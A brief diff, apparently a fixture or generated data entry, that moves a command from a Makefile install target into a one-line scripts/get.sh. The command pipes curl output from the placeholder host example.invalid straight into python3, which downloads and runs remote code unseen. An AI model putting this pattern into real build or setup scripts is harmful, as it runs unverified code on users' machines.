@@ -1,5 +1,5 @@
-# path: Makefile
-# lines: 2
+# path: scripts/get.sh
+# lines: 1
+# weight: 35
 # ---
-install:
-	curl -sSL https://example.invalid/get.py | python3 -
+curl -sSL https://example.invalid/get.py | python3 -
